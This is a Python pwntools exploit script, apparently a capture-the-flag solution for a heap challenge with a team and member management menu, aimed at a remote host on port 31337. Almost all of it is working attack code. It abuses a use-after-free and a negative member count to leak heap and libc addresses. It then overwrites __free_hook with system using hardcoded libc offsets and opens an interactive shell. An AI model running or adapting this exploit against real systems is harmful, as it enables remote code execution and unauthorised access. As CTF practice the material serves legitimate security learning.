#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwnpwnpwn import *
from pwn import *

#host = "10.211.55.6"
#port = 8888

host = "13.124.157.141"
port = 31337

r = remote(host,port)

def addteam(name,length):
    r.recvuntil(">")
    r.sendline("1")
    r.recvuntil(":")
    r.sendline(str(length))
    r.recvuntil(":")
    r.sendline(str(name))

def manage(idx):
    r.recvuntil(">")
    r.sendline("3")
    r.recvuntil(":")
    r.sendline(str(idx))

def addmember(count,name,desc):
    r.recvuntil(">")
    r.sendline("1")
    r.recvuntil(":")
    r.sendline(str(count))
    if count > 0 :
        for i in range(count):
            r.recvuntil(":")
            r.sendline(name)
            r.recvuntil(":")
            r.sendline(desc)

def delmember(idx):
    r.recvuntil(">")
    r.sendline("2")
    r.recvuntil(":")
    r.sendline(str(idx))

def ret():
    r.recvuntil(">")
    r.sendline("5")

def delteam(idx):
    r.recvuntil(">")
    r.sendline("2")
    r.recvuntil(":")
    r.sendline(str(idx))

def listteam():
    r.recvuntil(">")
    r.sendline("4")

def managemember(idx,desc):
    r.recvuntil(">")
    r.sendline("4")
    r.recvuntil(":")
    r.sendline(str(idx))
    r.recvuntil(":")
    r.sendline(desc)

addteam("orange",24) #0
manage(0)
addmember(1,"da","gg")
addmember(1,"da","gg")
delmember(0)
ret()
addteam("orange",24) #1
delteam(0)
addteam("a"*15,24) #0
listteam()
r.recvuntil("a"*15 + "\n")
heap = u64(r.recvuntil("Size")[:6].ljust(8,"\x00")) - 0x50
print hex(heap)
addteam("b"*7,24)
listteam()
r.recvuntil("b"*7 + "\n")
libc = u64(r.recvuntil("Size")[:6].ljust(8,"\x00"))  - 0x3c4b78
print hex(libc)
manage(0)
addmember(2,"da","nogg")
addmember(-2,"dd","gg")
ret()
free_hook = libc + 0x3c67a8
system = libc + 0x45390
sh = libc + 0x18cd17
addteam(p64(free_hook) + p64(sh),0x20)
manage(0)
managemember(0,p64(system))
delmember(1)
r.interactive()
